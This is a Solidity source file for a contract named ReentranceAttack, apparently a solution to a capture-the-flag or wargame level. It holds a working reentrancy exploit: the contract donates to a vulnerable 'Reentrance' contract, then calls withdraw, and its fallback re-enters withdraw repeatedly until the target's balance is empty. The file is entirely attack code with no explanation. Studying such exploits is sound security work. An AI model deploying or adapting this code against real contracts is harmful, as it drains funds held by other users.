pragma solidity 0.8.0;

import "./Reentrancy.sol";


contract ReentranceAttack {
	Reentrance public reentranceContract;

	constructor(address payable _vulnAddress) public payable{
        reentranceContract = Reentrance(_vulnAddress);
    }

    function attack() external payable {
        require(msg.value >= 1);
        reentranceContract.donate{value: 300000 gwei, gas: 40000000}(address(this));
        reentranceContract.withdraw(100000 gwei);
    }

    fallback() external payable{
        if (address(reentranceContract).balance != 0) {
            reentranceContract.withdraw(100000 gwei);
        }
    }

    function getBalance() public view returns (uint){
        return address(this).balance;
    }
}